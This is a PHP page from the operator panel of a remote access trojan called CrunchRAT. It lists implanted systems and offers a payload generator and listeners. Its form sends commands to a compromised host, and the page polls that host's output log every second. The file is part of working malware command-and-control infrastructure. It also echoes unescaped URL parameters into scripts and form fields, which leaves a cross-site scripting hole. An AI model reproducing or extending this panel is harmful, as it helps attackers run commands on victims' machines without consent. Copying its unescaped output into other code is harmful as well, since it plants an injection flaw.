<?php
    # Necessary at the top of every page for session management
    session_start();

    include "connector.php";

    # If unauthenticated
    if (!isset($_SESSION["authenticated"])) {
        header("Location: 403.php");
    }

    $hostname = $_GET["h"];
    $process_id = $_GET["pid"];

    # Determines if the supplied "h" and "pid" values are valid and not fuzzed parameters
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();
    $statement->connection = null;

    # Redirects to "404.php" page if invalid or fuzzed parameters
    if ($row_count == "0") {
        header("Location: 404.php");
    }
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <title>CrunchRAT</title>
        <link rel="icon" href="favicon.ico" type="image/x-icon">
        <!-- CSS -->
        <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&amp;subset=latin,cyrillic-ext" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" type="text/css">
        <link href="plugins/bootstrap/css/bootstrap.css" rel="stylesheet">
        <link href="plugins/node-waves/waves.css" rel="stylesheet" />
        <link href="plugins/animate-css/animate.css" rel="stylesheet" />
        <link href="plugins/morrisjs/morris.css" rel="stylesheet" />
        <link href="css/style.css" rel="stylesheet">
        <link href="css/themes/all-themes.css" rel="stylesheet" />
    </head>

    <body class="theme-red">
        <!-- Start of navigation bar (top) -->
        <nav class="navbar">
            <div class="container-fluid">
                <div class="navbar-header">
                    <a href="" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false"></a>
                    <a href="" class="bars"></a>
                    <a class="navbar-brand" href="index.php">CrunchRAT</a>
                </div>
            </div>
        </nav><!-- End of navigation bar (top) -->

        <!-- Start of navigation bar (left) -->
        <section>
            <aside id="leftsidebar" class="sidebar">
            <!-- Start of user information -->
            <div class="user-info">
                <div class="image">
                    <img src="images/Bebop.png" width="48" height="48" alt="User" />
                </div>
                <div class="info-container">
                    <div class="name" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><?php echo htmlentities($_SESSION["username"]); ?></div>
                    <div class="btn-group user-helper-dropdown">
                        <i class="material-icons" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">keyboard_arrow_down</i>
                        <ul class="dropdown-menu pull-right">
                            <li><a href="">Change Password</a></li>
                            <li role="seperator" class="divider"></li>
                            <li><a href="logout.php"><i class="material-icons">input</i>Sign Out</a></li>
                        </ul>
                    </div>
                </div>
            </div><!-- End of user information -->

            <!-- Start of left menu links -->
            <div class="menu">
                <ul class="list">
                    <!-- Home -->
                    <li>
                        <a href="index.php">
                            <i class="material-icons">home</i>
                            <span>Home</span>
                        </a>
                    </li>
                    <!-- Implanted Systems -->
                    <li class="active">
                        <a href="javascript:void(0);" class="menu-toggle">
                            <i class="material-icons">computer</i>
                            <span>Implanted Systems</span>
                        </a>
                        <ul class="ml-menu">
                            <li><a href="viewImplants.php">View All</a></li>
                            <?php
                                # Dynamically generates "Implanted Systems" links
                                $statement = $database_connection->prepare("SELECT `hostname`, `process_id` FROM `implants`");
                                $statement->execute();
                                $results = $statement->fetchAll();

                                foreach ($results as $row) {
                                    $url = "interact.php?h=" . urlencode($row["hostname"]) . "&pid=" . $row["process_id"];
                                    echo "<li><a href='" . $url . "'>" . htmlentities($row["hostname"]) . " (" . htmlentities($row["process_id"]) . ") " . "</a></li>";
                                }

                                $statement->connection = null;
                            ?>
                        </ul>
                    </li>
                    <!-- Payload Generator -->
                    <li>
                        <a href="javascript:void(0);" class="menu-toggle">
                            <i class="material-icons">publish</i>
                            <span>Payload Generator</span>
                        </a>
                        <ul class="ml-menu">
                            <li>
                                <a href="">Python (Native)</a>
                            </li>
                            <li>
                                <a href="">Macro</a>
                            </li>
                        </ul>
                    </li>
                    <!-- Listeners -->
                    <li>
                        <a href="listeners.php">
                            <i class="material-icons">phone</i>
                            <span>Listeners</span>
                        </a>
                    </li>
                </ul>
            </div><!-- End of left menu links -->
            </aside>
        </section><!-- End of navigation bar (left) -->

        <!-- Start of main content -->
        <section class="content">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                        <div class="card">
                            <div class="header">
                                <?php echo "<h2>" . htmlentities($hostname) . " (" . htmlentities($process_id) . ") " . "</h2>"; ?>
                            </div>

                            <div class="body">
                                <!-- Tab headings -->
                                <ul class="nav nav-tabs tab-nav-right" role="tablist">
                                    <li role="presentation" class="active"><a href="#command" data-toggle="tab">COMMAND</a></li>
                                    <li role="presentation"><a href="#tasks" data-toggle="tab">TASKS</a></li>
                                </ul>
                                <!-- Tab content -->
                                <div class="tab-content">
                                    <!-- "COMMAND" tab -->
                                    <div role="tabpanel" class="tab-pane fade in active" id="command">
                                        <!-- Command Output -->
                                        <div class="form-group">
                                            <!-- Custom CSS to make command output a certain height (and ultimately scroll-able) -->
                                            <style>
                                                pre {
                                                    height: 500px;
                                                    overflow: auto;
                                                }
                                            </style>
                                            <pre id="output"></pre><!-- This will be populated with output from <PID>.log -->
                                            <script src="plugins/jquery/jquery.min.js" type="text/javascript"></script>
                                            <script type="text/javascript">
                                                // Updates "output" id every second
                                                $("document").ready(function(){
                                                    setInterval(function(){
                                                        // Parses HTTP GET parameters
                                                        var hostname = "<?php echo $_GET['h']; ?>";
                                                        var process_id = "<?php echo $_GET['pid']; ?>";

                                                        // Builds URL and loads log file
                                                        var url = 'getLog.php?h=' + hostname + '&pid=' + process_id;
                                                        $("#output").load(url);

                                                        // Scrolls to end
                                                        // Source: http://stackoverflow.com/questions/270612/scroll-to-bottom-of-div
                                                        $("#output").scrollTop($("#output")[0].scrollHeight);

                                                    },1000);
                                                });
                                            </script>
                                        </div>
                                        <!-- "Task Command" form and button -->
                                        <form action="commandSubmit.php" method="POST">
                                            <div class="form-group">
                                                <div class="form-line">
                                                    <input type="text" class="form-control no-resize auto-growth" name="command" placeholder="Command">
                                                </div>
                                                <!-- Current hostname field -->
                                                <input type="hidden" name="hostname" value="<?php echo $hostname; ?>" />
                                                <!-- Current process ID field -->
                                                <input type="hidden" name="process_id" value="<?php echo $process_id; ?>" />
                                                <!-- Submit button -->
                                                <button type="submit" class="btn btn-primary m-t-15 waves-effect">TASK COMMAND</button>
                                            </div>
                                        </form>
                                    </div>
                                    <!-- "TASKS" tab -->
                                    <div role="tabpanel" class="tab-pane fade" id="tasks">
                                        <!-- Start of dataTable -->
                                        <div class="table-responsive">
                                            <table class="table table-bordered table-striped table-hover js-basic-example dataTable">
                                                <thead>
                                                    <tr>
                                                        <th>Task Management</th>
                                                        <th>Unique ID</th>
                                                        <th>Task Action</th>
                                                        <th>Task Secondary</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php
                                                        # Dynamically builds the dataTable
                                                        $statement = $database_connection->prepare("SELECT `unique_id`, `task_action`, `task_secondary` FROM `tasks` WHERE `hostname` = :hostname AND `process_id` = :process_id");
                                                        $statement->bindValue(":hostname", $hostname);
                                                        $statement->bindValue(":process_id", $process_id);
                                                        $statement->execute();
                                                        $results = $statement->fetchAll();

                                                        foreach ($results as $row) {
                                                            # Builds "Delete Task" link
                                                            $url = "deleteTask.php?uid=" . $row["unique_id"];

                                                            echo "<tr>";
                                                            echo "<td><div class='btn-group'><a class='btn bg-red waves-effect' href=" . $url . ">Delete Task</a></div></td>";
                                                            echo "<td>" . htmlentities($row["unique_id"]) . "</td>";
                                                            echo "<td>" . htmlentities($row["task_action"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["task_secondary"]) ."</td>";
                                                            echo "</tr>";
                                                        }

                                                        $statement->connection = null;
                                                    ?>
                                                </tbody>
                                            </table>
                                        </div><!-- End of dataTable -->
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section><!-- End of main content -->

        <!-- JavaScript -->
        <script src="plugins/jquery/jquery.min.js"></script>
        <script src="plugins/bootstrap/js/bootstrap.js"></script>
        <script src="plugins/bootstrap-select/js/bootstrap-select.js"></script>
        <script src="plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
        <script src="plugins/node-waves/waves.js"></script>
        <script src="plugins/jquery-datatable/jquery.dataTables.js"></script>
        <script src="plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/jszip.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script>
        <script src="js/admin.js"></script>
        <script src="js/pages/tables/jquery-datatable.js"></script>
        <script src="js/demo.js"></script>
    </body>
</html>